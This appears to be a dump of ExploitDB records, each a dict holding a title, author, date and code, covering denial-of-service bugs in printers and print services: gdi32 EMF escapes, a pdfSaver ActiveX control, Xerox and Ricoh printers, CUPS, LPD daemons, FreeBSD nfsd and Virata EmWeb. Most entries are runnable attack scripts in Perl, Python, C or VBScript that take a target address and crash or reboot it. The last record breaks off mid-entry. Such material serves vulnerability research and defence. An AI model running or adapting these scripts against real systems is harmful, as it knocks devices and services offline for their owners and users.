{u'code': u'Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=731\r\n\r\nTwo of the escape codes supported by the public ExtEscape() API are POSTSCRIPT_IDENTIFY and POSTSCRIPT_INJECTION, which are only processed if the Device Context is associated with a printer. In the code responsible for handling the two escape codes, we can find the following constructs:\r\n\r\n--- cut ---\r\n.text:7DAE3E9F                 mov     ecx, [ebp+cjInput]\r\n.text:7DAE3EA2                 lea     eax, [ecx+1Ah]\r\n.text:7DAE3EA5                 add     ecx, 17h\r\n.text:7DAE3EA8                 cmp     eax, ecx\r\n.text:7DAE3EAA                 jb      loc_7DAD19AD\r\n.text:7DAE3EB0                 and     eax, 0FFFFFFFCh\r\n.text:7DAE3EB3                 mov     [ebp+Size], eax\r\n.text:7DAE3EB9                 push    [ebp+Size]      ; Size\r\n.text:7DAE3EBF                 mov     eax, large fs:18h\r\n.text:7DAE3EC5                 mov     eax, [eax+30h]\r\n.text:7DAE3EC8                 push    0               ; Flags\r\n.text:7DAE3ECA                 push    dword ptr [eax+18h] ; HeapHandle\r\n.text:7DAE3ECD                 call    ds:__imp__RtlAllocateHeap@12 ; RtlAllocateHeap(x,x,x)\r\n...\r\n.text:7DAE3EEF                 mov     eax, [ebp+cjInput]\r\n.text:7DAE3EF2                 push    eax             ; Size\r\n.text:7DAE3EF3                 mov     [esi+10h], eax\r\n.text:7DAE3EF6                 lea     eax, [esi+14h]\r\n.text:7DAE3EF9                 push    edi             ; Src\r\n.text:7DAE3EFA                 push    eax             ; Dst\r\n.text:7DAE3EFB                 call    _memcpy\r\n--- cut ---\r\n\r\nwhich can be translated to the following C-like pseudocode (assuming 32-bit wide types):\r\n\r\n--- cut ---\r\nif (cjInput + 26 > cjInput > 23) {\r\n  buffer = Allocate((cjInput + 26) & ~4);\r\n  ...\r\n  memcpy(buffer + 20, lpInData, cjInput);\r\n  ...\r\n}\r\n--- cut ---\r\n\r\nFrom the code snippet shown above, it is clear that while it checks for a possible integer overflow between cjInput+23 and cjInput+26, it does not check if the "+23" part overflows the 32-bit type or not. As a consequence, if cjInput is set to anywhere between -23 and -1, a small heap-based buffer will be allocated (<30 bytes) and the function will try to copy ~4GB of data into it, leading to an obvious buffer overflow condition.\r\n\r\nUnder normal circumstances, the problem can only be triggered with an unusually large value of the cjInput parameter, which is unlikely to be used by a programmer. However, EMF (Enhanced Windows Metafile) files can act as remote proxy for DrawEscape() (via EMR_DRAWESCAPE) and ExtEscape() (via EMR_EXTESCAPE) calls. Interestingly, the corresponding MRESCAPE::bCheckRecord() record verification routine doesn\'t ensure that the cjInput value is valid (i.e. that enough input data is actually present in the record). As a result, a specially crafted EMF file can pass any controlled value as cjInput, thus potentially /lying/ to ExtEscape() about the number of input bytes. Lack of cjInput sanitization in MRESCAPE::bCheckRecord() is therefore believed to be the culprit of the bug (regardless of the integer overflow in ExtEscape()).\r\n\r\nWhile this is just one example of what an arbitrary cjInput parameter passed to DrawEscape() / ExtEscape() may lead to, we suspect that it could also have other security implications, e.g. if any of the functions trust cjInput and read beyond the record buffer, and then use the data in such a way that it is possible to retrieve it back in the client (like Internet Explorer), then it could be used as a memory disclosure primitive.\r\n\r\nAs previously mentioned, the bug only reproduces when the destination HDC is associated with a printer. After a brief search I haven\'t found a vector to achieve this using existing Windows client applications supporting the EMF format (such as IE), so I\'ve developed a short dedicated program to demonstrate the problem (poc.cc), which boils down to the following API calls:\r\n\r\n--- cut ---\r\nHDC hdc = CreateDC("WINSPOOL", "Fax", NULL, NULL);\r\nHENHMETAFILE hemf = GetEnhMetaFile("poc.emf");\r\n\r\nRECT rect = {0, 0, 100, 100};\r\nPlayEnhMetaFile(hdc, hemf, &rect);\r\n--- cut ---\r\n\r\nUpon compiling it and starting with the enclosed poc.emf file in the current working directory, the expected crash is generated in memcpy():\r\n\r\n--- cut ---\r\n(353c.fa4): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=003300e7 ebx=004ffbe8 ecx=3ffffc39 edx=00000003 esi=00331000 edi=00500c1c\r\neip=779823a3 esp=0028fb34 ebp=0028fb3c iopl=0         nv up ei pl nz na po nc\r\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202\r\nntdll!memcpy+0x33:\r\n779823a3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\r\n\r\n0:000> kb\r\nChildEBP RetAddr  Args to Child              \r\n0028fb3c 771a3f00 004ffd04 003300e8 ffffffff ntdll!memcpy+0x33\r\n0028fd98 771c3fa9 bc21881a 00001015 ffffffff GDI32!ExtEscape+0x431\r\n0028fdbc 77194e17 bc21881a 004f9588 00000004 GDI32!MRESCAPE::bPlay+0x32\r\n0028fe34 7719ca93 bc21881a 004f9588 003300d8 GDI32!PlayEnhMetaFileRecord+0x2c5\r\n0028febc 7719caf2 bc21881a 423d5f3a 00000000 GDI32!bInternalPlayEMF+0x66b\r\n0028fed8 00401479 bc21881a b6467a1d 0028fef8 GDI32!PlayEnhMetaFile+0x32\r\nWARNING: Stack unwind information not available. Following frames may be wrong.\r\n0028ff18 004010fd 0028ff28 75949e34 7efde000 image00400000+0x1479\r\n0028ff94 77999882 7efde000 4f2b9f18 00000000 image00400000+0x10fd\r\n0028ffd4 77999855 00401280 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70\r\n0028ffec 00000000 00401280 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b\r\n--- cut ---\r\n\r\nThe bug has been reproduced on a fully patched Windows 7 64-bit with a 32-bit POC program, but the 64-bit build of gdi32.dll also seems to be affected.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39834.zip', u'description': u"Microsoft Windows - 'gdi32.dll' Heap Buffer Overflow in ExtEscape() Triggerable via EMR_EXTESCAPE EMF Record (MS16-055)", u'platform': u'multiple', u'author': u'Google Security Research', u'cve': [], u'source': u'ExploitDB', u'date': u'2016-05-17T00:00:00+00:00', u'_id': 39834, u'type': u'dos', u'port': 0}

CVE: []
Description: Tracker Software pdfSaver ActiveX 3.60 - 'pdfxctrl.dll' Stack Buffer Overflow (SEH) (PoC)
{u'code': u'Tracker Software pdfSaver ActiveX 3.60 (pdfxctrl.dll) Stack Buffer Overflow (SEH)\r\n\r\n\r\nVendor:\r\n-------\r\nTracker Software Products Ltd.\r\n\r\n\r\nProduct web page:\r\n-----------------\r\nhttp://www.tracker-software.com\r\n\r\n\r\nAffected version:\r\n-----------------\r\n3.60.0128\r\n\r\n\r\nSummary:\r\n--------\r\nPDF-Saver Technology is a unique new feature of PDF-XChange software\r\nwhich allows printing jobs to be combined prior to the final PDF file\r\nbeing generated - (e.g. to join 3 pages of Excel spreadsheet, 5 slides\r\nof PowerPoint presentation and 10 pages of Word document into one PDF\r\ndocument).\r\n\r\n\r\nDescription:\r\n------------\r\nThe PDF Printer Preferences ActiveX suffers from a buffer overflow\r\nvulnerability. When a large buffer is sent to the sub_path item of the\r\nStoreInRegistry function, and the sub_key item of the InitFromRegistry\r\nfunction, in pdfxctrl.dll module, we get a SEH overwrite. An attacker\r\ncan gain access to the system of the affected node and execute arbitrary\r\ncode.\r\n\r\n\r\n------------------------------------------------------------------------\r\n\r\n(1fac.1ea8): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=0013e9e0 ebx=00000003 ecx=0000008c edx=00001815 esi=0013cd74 edi=0013fffd\r\neip=7c834d8f esp=0013b75c ebp=0013b780 iopl=0         nv up ei pl nz na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\nkernel32!lstrcatA+0x36:\r\n7c834d8f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\r\n0:000> !exchain\r\n0013b770: kernel32!_except_handler3+0 (7c839ac0)\r\n  CRT scope  0, filter: kernel32!lstrcatA+45 (7c84086d)\r\n                func:   kernel32!lstrcatA+49 (7c840876)\r\n0013f1ac: 41414141\r\nInvalid exception stack at 41414141\r\n0:000> d esp\r\n0013b75c  2a 30 00 00 cc 63 18 00-03 00 00 00 5c b7 13 00  *0...c......\\...\r\n0013b76c  2a 30 00 00 ac f1 13 00-c0 9a 83 7c a8 4d 83 7c  *0.........|.M.|\r\n0013b77c  00 00 00 00 e4 ed 13 00-e7 d8 01 10 e0 e9 13 00  ................\r\n0013b78c  90 b7 13 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA\r\n0013b79c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\r\n0013b7ac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\r\n0013b7bc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\r\n0013b7cc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\r\n\r\n------------------------------------------------------------------------\r\n\r\n\r\nTested on:\r\n----------\r\nMicrosoft Windows XP Professional SP3 (EN)\r\n\r\n\r\nVulnerability discovered by:\r\n----------------------------\r\nGjoko \'LiquidWorm\' Krstic\r\nliquidworm gmail com\r\nZero Science Lab - http://www.zeroscience.mk\r\n\r\n\r\nAdvisory ID:\r\n------------\r\nZSL-2012-5067\r\n\r\n\r\nAdvisory URL:\r\n-------------\r\nhttp://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5067.php\r\n\r\n\r\n\r\n25.01.2012\r\n\r\n\r\nPoC (COMRaider):\r\n----------------\r\n\r\n<object classid=\'clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18\' id=\'zsl\' />\r\n<script language=\'vbscript\'>\r\n\r\ntargetFile = "C:\\PDF-XChange\\pdfSaver\\pdfxctrl.dll"\r\nprototype  = "Sub StoreInRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_path As String )"\r\nmemberName = "StoreInRegistry"\r\nprogid     = "pdfxctrlLib.PdfPrinterPreferences"\r\nargCount   = 2\r\n\r\narg1=1\r\narg2=String(6164, "A")\r\n\r\nzsl.StoreInRegistry arg1 ,arg2 \r\n\r\n</script>\r\n\r\n--------------------\r\n\r\n<object classid=\'clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18\' id=\'zsl\' />\r\n<script language=\'vbscript\'>\r\n\r\ntargetFile = "C:\\PDF-XChange\\pdfSaver\\pdfxctrl.dll"\r\nprototype  = "Sub InitFromRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_key As String )"\r\nmemberName = "InitFromRegistry"\r\nprogid     = "pdfxctrlLib.PdfPrinterPreferences"\r\nargCount   = 2\r\n\r\narg1=1\r\narg2=String(14356, "A")\r\n\r\nzsl.InitFromRegistry arg1 ,arg2 \r\n\r\n</script>', u'description': u"Tracker Software pdfSaver ActiveX 3.60 - 'pdfxctrl.dll' Stack Buffer Overflow (SEH) (PoC)", u'platform': u'windows', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-01-29T00:00:00+00:00', u'_id': 18427, u'type': u'dos', u'port': 0}

CVE: []
Description: Xerox Phaser 8400 - Remote Reboot (Denial of Service)
{u'code': u'#!/usr/bin/perl\r\n# carved-out by: crit3rion, just making th3 world a b3tt3r plac3!\r\n# Xerox_Remote_DoS.20080801.ver01 (tanx to dr0pz0N3 for reminding me to close my #$*&*! s0ck3t)\r\n# Make: Xerox\r\n# Model: Phaser 8400\r\n# Firmware: 03/03/2004\r\n#\r\n# What\'s the deal?\r\n# Apparently, if you send an empty packet to a Xerox Phaser 8400 printer\r\n# the printer will reboot.  Tested successfully on four printers.\r\n# \r\n\r\n# Let\'s not leave our maliciousness open to exploitation and errors!\r\nuse strict;\r\nuse warnings;\r\nuse IO::Socket::INET;\r\n\r\n# What\'s your printer\'s IP Address?\r\nprint "Please enter the printers IP:\\n";\r\nmy $ipaddr = <STDIN>;\r\nchomp $ipaddr;\r\n\r\n# Let\'s setup the connection...\r\nmy $socket = IO::Socket::INET->new(\r\n PeerPort => 1900,\r\n PeerAddr => $ipaddr,\r\n Proto => "udp" )\r\n or die "I tried. Maybe you entered the wrong IP?\\n Maybe it\'s just my bad code...\\n In any case, check: $@\\n\\n";\r\n\r\n# Okay... Let\'s kill it.\r\n$socket->send("");\r\n$socket->close();\r\n\r\nprint "Done. It should have died.\\n\\n";\r\nexit(1);\r\n\r\n# milw0rm.com [2008-08-03]', u'description': u'Xerox Phaser 8400 - Remote Reboot (Denial of Service)', u'platform': u'hardware', u'author': u'crit3rion', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-08-03T00:00:00+00:00', u'_id': 6196, u'type': u'dos', u'port': 0}

CVE: []
Description: NetSarang Xlpd Printer Daemon 4 - Denial of Service
{u'code': u'##############################################################################\r\n#\r\n# Title    : NetSarang Xlpd Printer Daemon Denial of Service Vulnerability\r\n# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)\r\n# Vendor   : http://www.netsarang.com\r\n# Advisory : http://secpod.org/blog/?p=457\r\n#            http://secpod.org/advisories/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS_Vuln.txt\r\n#            http://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py\r\n# Software : NetSarang Xlpd 4 Build 0100 and NetSarang Xmanager Enterprise 4 Build 0186\r\n# Date     : 01/02/2012\r\n#\r\n##############################################################################\r\n\r\nSecPod ID: 1033\t\t\t\t\t14/12/2011 Issue Discovered\r\n\t\t\t\t\t\t20/01/2012 Vendor Notified\r\n\t\t\t\t\t\tNo Response\r\n\t\t\t\t\t\t01/02/2012 Advisory Released\r\n\r\nClass: Denial Of Service\t\t\tSeverity: Medium\r\n\r\n\r\nOverview:\r\n---------\r\nNetSarang Xlpd Printer Daemon version 4 is prone to a denial of service \r\nvulnerability.\r\n\r\n\r\nTechnical Description:\r\n----------------------\r\nThe vulnerability is caused due to improper validation of malicious LPD \r\nrequest sent to printer daemon, which allows remote attackers to crash the \r\nservice.\r\n\r\n\r\nImpact:\r\n--------\r\nSuccessful exploitation could allow an attacker to cause denial of service\r\ncondition.\r\n\r\n\r\nAffected Software:\r\n------------------\r\nNetSarang Xlpd 4 Build 0100\r\nNetSarang Xmanager Enterprise 4 Build 0186\r\n\r\n\r\nTested on:\r\n-----------\r\nNetSarang Xlpd 4 Build 0100 on Windows XP SP3.\r\nNetSarang Xmanager Enterprise 4 Build 0186 on Windows XP SP3.\r\nOlder versions might be affected.\r\n\r\n\r\nReferences:\r\n-----------\r\nhttp://www.netsarang.com\r\nhttp://secpod.org/blog/?p=457\r\n\r\n\r\nProof of Concept:\r\n----------------\r\nhttp://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py\r\n\r\n\r\nSolution:\r\n----------\r\nNot available\r\n\r\n\r\nRisk Factor:\r\n-------------\r\n    CVSS Score Report:\r\n        ACCESS_VECTOR          = NETWORK\r\n        ACCESS_COMPLEXITY      = LOW\r\n        AUTHENTICATION         = NOT_REQUIRED\r\n        CONFIDENTIALITY_IMPACT = NONE\r\n        INTEGRITY_IMPACT       = NONE\r\n        AVAILABILITY_IMPACT    = PARTIAL\r\n        EXPLOITABILITY         = PROOF_OF_CONCEPT\r\n        REMEDIATION_LEVEL      = UNAVAILABLE\r\n        REPORT_CONFIDENCE      = CONFIRMED\r\n        CVSS Base Score        = 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)\r\n        Risk factor            = Medium\r\n\r\nCredits:\r\n--------\r\nPrabhu S Angadi of SecPod Technologies has been credited with the discovery of this\r\nvulnerability.\r\n\r\n\r\n#!/usr/bin/python\r\n##############################################################################\r\n#\r\n# Title    : NetSarang Xlpd Printer Daemon Denial of Service Vulnerability\r\n# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)\r\n# Vendor   : http://www.netsarang.com\r\n# Advisory : http://secpod.org/blog/?p=457\r\n#            http://secpod.org/advisories/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS_Vuln.txt\r\n#            http://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py\r\n# Software : NetSarang Xlpd 4 Build 0100 and NetSarang Xmanager Enterprise 4 Build 0186\r\n# Date     : 01/02/2012\r\n#\r\n##############################################################################\r\n\r\nimport socket,sys,time\r\n\r\nport = 515\r\n\r\nif len(sys.argv) < 2:\r\n    print "\\n[-] Usage: %s <target addr>" % sys.argv[0]\r\n    sys.exit(0)\r\n\r\ntarget = sys.argv[1]\r\n\r\nsockObj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n\r\ntry:\r\n    sockObj.connect((target,port))\r\nexcept:\r\n    print "\\n[-] Xlpd service is down."\r\n    sys.exit(0)\r\n\r\nsockObj.send("crap"+"LF")\r\nsockObj.send("LF")\r\n#Will wait for a while\r\ntime.sleep(5)\r\nsockObj.close()\r\n\r\ntry:\r\n    sockObj.connect((target,port))\r\nexcept:\r\n    print "\\n[-] Xlpd service is crashed, unble to connect"\r\n\r\nsys.exit(0)', u'description': u'NetSarang Xlpd Printer Daemon 4 - Denial of Service', u'platform': u'windows', u'author': u'SecPod Research', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-02-02T00:00:00+00:00', u'_id': 18454, u'type': u'dos', u'port': 0}

CVE: []
Description: CUPS 1.3.9 - 'cups/ipp.c' Null Pointer Dereference Denial of Service
{u'code': u'source: http://www.securityfocus.com/bid/35169/info\r\n\r\nCUPS is prone to a denial-of-service vulnerability because of a NULL-pointer dereference that occurs when processing two consecutive IPP_TAG_UNSUPPORTED tags in specially crafted IPP (Internet Printing Protocal) packets.\r\n\r\nAn attacker can exploit this issue to crash the affected application, denying service to legitimate users.\r\n\r\nfrom struct import pack\r\nimport sys\r\nimport socket\r\n\r\nclass IppRequest:\r\n    """\r\n    Little class to implement a basic Internet Printing Protocol\r\n    """\r\n    def __init__(self, host, port, printers, hpgl_data="a"):\r\n        self.printers = printers\r\n        self.host = host\r\n        self.port = port\r\n        self.hpgl_data = hpgl_data\r\n        self.get_ipp_request()\r\n\r\n    def attribute(self, tag, name, value):\r\n        data =  pack(\'>B\',tag)\r\n        data += pack(\'>H\',len(name))\r\n        data += name\r\n        data += pack(\'>H\',len(value))\r\n        data += value\r\n        return data\r\n\r\n    def get_http_request(self):\r\n        http_request = "POST /printers/%s HTTP/1.1\\r\\n" % self.printers\r\n        http_request += "Content-Type: application/ipp\\r\\n"\r\n        http_request += "User-Agent: Internet Print Provider\\r\\n"\r\n        http_request += "Host: %s\\r\\n" % self.host\r\n        http_request += "Content-Length: %d\\r\\n" % len(self.ipp_data)\r\n        http_request += "Connection: Keep-Alive\\r\\n"\r\n        http_request += "Cache-Control: no-cache\\r\\n"\r\n        return http_request\r\n\r\n    def get_ipp_request(self):\r\n        operation_attr =  self.attribute(0x47, \'attributes-charset\', \'utf-8\')\r\n        operation_attr += self.attribute(0x48, \'attributes-natural-language\', \'en-us\')\r\n        operation_attr += self.attribute(0x45, \'printer-uri\', "http://%s:%s/printers/%s" % (self.host, self.port, self.printers))\r\n        operation_attr += self.attribute(0x42, \'job-name\', \'foo barrrrrrrr\')\r\n        operation_attr += self.attribute(0x42, \'document-format\', \'application/vnd.hp-HPGL\')\r\n\r\n        self.ipp_data =  "\\x01\\x00"           # version-number: 1.0\r\n        self.ipp_data += "\\x00\\x02"           # operation-id: Print-job\r\n        self.ipp_data += "\\x00\\x00\\x00\\x01"   # request-id: 1\r\n        self.ipp_data += "\\x01"               # operation-attributes-tag\r\n        self.ipp_data += "\\x0f\\x0f"           \r\n        # self.ipp_data += operation_attr\r\n        self.ipp_data += "\\x02"               # job-attributes-tag\r\n        self.ipp_data += "\\x03"               # end-of-attributes-tag\r\n        self.ipp_data += self.hpgl_data;\r\n        return self.ipp_data\r\n\r\ndef main():\r\n\r\n    try:\r\n        printer = sys.argv[1]\r\n        host = sys.argv[2]\r\n    except:\r\n        print "[+] Usage: exploit printer_name host"\r\n        return 0\r\n    \r\n    data = "A"*100\r\n\r\n    ipp = IppRequest(host,"80", printer, data)\r\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\r\n    print "[+] Connecting to the host"\r\n    s.connect((host, 631))\r\n\r\n    #requests = ipp.get_http_request()\r\n    #for each in requests:\r\n    #    s.send(each)\r\n\r\n    print "[+] Sending request"\r\n    s.send(ipp.get_http_request())\r\n    s.send("\\r\\n")\r\n\r\n    print "[+] Sending ipp data"\r\n    s.send(ipp.get_ipp_request())\r\n\r\n    print "Response:%s" % s.recv(1024)\r\n    print "done!"\r\n\r\nif __name__ == "__main__":\r\n    sys.exit(main())', u'description': u"CUPS 1.3.9 - 'cups/ipp.c' Null Pointer Dereference Denial of Service", u'platform': u'linux', u'author': u'Anibal Sacco', u'cve': [], u'source': u'ExploitDB', u'date': u'2009-06-02T00:00:00+00:00', u'_id': 33020, u'type': u'dos', u'port': 0}

CVE: []
Description: FreeBSD 6.0 - 'nfsd' Remote Kernel Panic (Denial of Service)
{u'code': u'#!/usr/bin/perl\r\n## Saw an advisory on Dailydave and wrote a little script to\r\n## check my freebsd boxes (kind of evil). /str0ke (milw0rm.com)\r\n##\r\n## ProtoVer NFS testsuite 1.0 uncovered remote kernel panic vulnerability in FreeBSD 6.0 kernel.\r\n## Evgeny Legerov\r\n## www.gleg.net\r\n\r\nuse IO::Socket;\r\n\r\nsub usage\r\n{\r\n    print "FreeBSD 6.0 (nfsd) Remote Kernel Panic Denial of Service Exploit\\n";\r\n    print "Advisory from Evgeny Legerov (www.gleg.net)\\n";\r\n    print "Code by str0ke (milw0rm.com)\\n";\r\n    print "Usage: $0 www.example.com\\n";\r\n    exit ();\r\n}\r\n\r\nmy $host = shift || &usage;\r\n\r\nmy $printer = "\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00" .\r\n              "\\x00\\x00\\x00\\x02\\x00\\x01\\x86\\xa5\\x00\\x00\\x00\\x01" .\r\n              "\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" .\r\n              "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04" .\r\n              "\\x2f\\x74\\x6d\\x70";\r\n\r\n$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $host, PeerPort => "2049") || die "\\n+ Connection failed...\\n";\r\nprint $socket $printer . "\\n";\r\n\r\n# milw0rm.com [2006-02-28]', u'description': u"FreeBSD 6.0 - 'nfsd' Remote Kernel Panic (Denial of Service)", u'platform': u'bsd', u'author': u'Evgeny Legerov', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-02-28T00:00:00+00:00', u'_id': 1540, u'type': u'dos', u'port': 0}

CVE: []
Description: Omnicom Alpha 4.0e LPD Server - Denial of Service
{u'code': u'#!/usr/bin/python\r\n#Title: Omnicom Alpha 4.0e LPD Server DoS\r\n#Author: Craig Freyman (@cd1zz)\r\n#Software Download: http://www.omnicomtech.com/download/bin/lpd.exe\r\n#Tested on: Windows XP SP3 (English), Server 2003 SP2 (English)\r\n#Dates: Bug Found 7/27/2011, Vendor Notified 8/1/2011, Vendor Responded 8/2/2011, Vendor approved release 8/3/2011\r\n#Notes: For this exploit to work, you must know the name of a printer queue on the server. \r\n\r\nimport socket,sys,time\r\n\r\nif len(sys.argv) < 3:\r\n\tprint "[-]Usage: %s <target addr> <queue name>" % sys.argv[0]\r\n\tsys.exit(0)\r\n\r\ntarget = sys.argv[1]\r\nqueue = sys.argv[2]\r\n\r\ncounter = 1\r\ncrash = "\\x41" * 7500\r\n\r\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n\r\ntry:\r\n\twhile counter<=50:\r\n\t\tprint "[*] Left jab "+str(counter)+" times."\r\n\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n\t\ts.connect((target,515))\r\n\t\ts.send("\\x02"+queue+" "+crash+"LF")\r\n\t\ttime.sleep(.25)\r\n\t\tcounter+=1\r\nexcept:\r\n    \tprint "[-] "+target+" has been knocked out with a right hook!"\r\n    \tsys.exit(0)', u'description': u'Omnicom Alpha 4.0e LPD Server - Denial of Service', u'platform': u'windows', u'author': u'Craig Freyman', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-08-03T00:00:00+00:00', u'_id': 17601, u'type': u'dos', u'port': 0}

CVE: []
Description: Ricoh Aficio 450/455 PCL 5e Printer - ICMP Denial of Service
{u'code': u'/*\r\n\r\n* RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.\r\n\r\n* DATE: 12.15.2004\r\n\r\n* Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>\r\n\r\n* Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782\r\n\r\n*\r\n\r\n* Testing -----------------------------------------------\r\n\r\n* root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c\r\n\r\n* root@testbed:~/raw# ./rpcl_icmpdos\r\n\r\n* Usage: ./rpcl_icmpdos <victim>\r\n\r\n* root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4\r\n\r\n* exploit sent ok() = ..x-_-x..\r\n\r\n* root@testbed:~/raw#\r\n\r\n*\r\n\r\n*/\r\n\r\n#include<sys/types.h>\r\n\r\n#include<sys/socket.h>\r\n\r\n#include<netinet/in.h>\r\n\r\n#include<arpa/inet.h>\r\n\r\n#include<linux/ip.h>\r\n\r\n#include<linux/icmp.h>\r\n\r\nunsigned short cksum(unsigned short *buf, int len);\r\n\r\nstruct icmp_packet{\r\n\r\n       struct icmphdr icmp;\r\n\r\n       struct iphdr inip;\r\n\r\n       unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data))\r\n\r\n} packet;\r\n\r\n/* ########################\r\n\r\n* #     Entry Point      #\r\n\r\n* ########################\r\n\r\n*/\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nstruct sockaddr_in ca;\r\n\r\nint sockfd, ret;\r\n\r\nif(argc<2){\r\n\r\n       printf("Usage: %s <victim>\\n", argv[0]);\r\n\r\n       exit(-1);\r\n\r\n}\r\n\r\nsockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\r\n\r\nmemset(&packet, 0, sizeof(packet));\r\n\r\npacket.icmp.type = 3;                           // STEP2: Destination Unreachable.\r\n\r\npacket.icmp.code = 1;\r\n\r\npacket.icmp.un.echo.id = getpid();\r\n\r\npacket.icmp.un.echo.sequence = 0;\r\n\r\npacket.inip.ihl = 5;\r\n\r\npacket.inip.version = 4;\r\n\r\npacket.inip.tot_len = htons(20);\r\n\r\npacket.inip.id = htons(9090);\r\n\r\npacket.inip.ttl = 90;\r\n\r\npacket.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable.\r\n\r\npacket.inip.saddr = inet_addr("127.0.0.1");\r\n\r\npacket.inip.daddr = inet_addr("127.0.0.1");\r\n\r\npacket.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);\r\n\r\npacket.icmp.checksum = cksum((void *)&packet, sizeof(packet));\r\n\r\nmemset(&ca, 0, sizeof(ca));\r\n\r\nca.sin_family = AF_INET;\r\n\r\nca.sin_addr.s_addr = inet_addr(argv[1]);\r\n\r\nif((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))\r\n\r\n       printf("exploit sent ok() = ..x-_-x..\\n");\r\n\r\nelse\r\n\r\n       printf("exploit sent failed() = ..o^O^o..\\n");\r\n\r\nclose(sockfd);\r\n\r\n}\r\n\r\n/* ########################\r\n\r\n* #  Internet Checksum   #\r\n\r\n* ########################\r\n\r\n*/\r\n\r\nunsigned short cksum(unsigned short *buf, int len){\r\n\r\nregister unsigned long sum;\r\n\r\nfor(sum = 0; len > 0; len--) sum += *buf++;\r\n\r\nsum = (sum >> 16) + (sum & 0xffff);\r\n\r\nsum += (sum >> 16);\r\n\r\nreturn ~sum;\r\n\r\n}\r\n\r\n// milw0rm.com [2004-12-15]', u'description': u'Ricoh Aficio 450/455 PCL 5e Printer - ICMP Denial of Service', u'platform': u'hardware', u'author': u'x90c', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-12-15T00:00:00+00:00', u'_id': 688, u'type': u'dos', u'port': 0}

CVE: []
Description: Virata EmWeb R6.0.1 - Remote Crash
{u'code': u"# Exploit Title: Virata EmWeb R6.0.1 Remote Crash Vulnerability\r\n# Date: 06/04/10\r\n# Author: Jobert Abma (Online 24)\r\n# Email: j.abma[at]online24[dot]nl\r\n# Version: R6.0.1\r\n# Tested on: linux\r\n# CVE :()\r\n# Code :\r\n\r\n# This was written for educational purpose. Use it at your own risk.\r\n# Author will be not responsible for any damage.\r\n\r\n- Exploit -\r\n\r\nThe Virata EmWeb software is embedded in multiple printers and DSL modems. For\r\nexample the HP Color LaserJet 2800-series. When sending a long header (long \r\nfilename), the printer will reboot. Other soft- and hardware isn't tested yet.\r\n\r\n- POC -\r\n\r\n#!/usr/bin/python\r\n\r\nimport socket\r\n\r\nhost   = '192.168.1.110'\r\nport   = 80\r\nheader = 'GET /' + ('A'*512) + ' HTTP/1.0\\r\\nHost: ' + host + '\\r\\nConnection: Close\\r\\n\\r\\n'\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect((host, port))\r\n\r\nprint 'Sending header...'\r\n\r\ns.send(header)\r\n\r\nprint 'Done!'", u'description': u'Virata EmWeb R6.0.1 - Remote 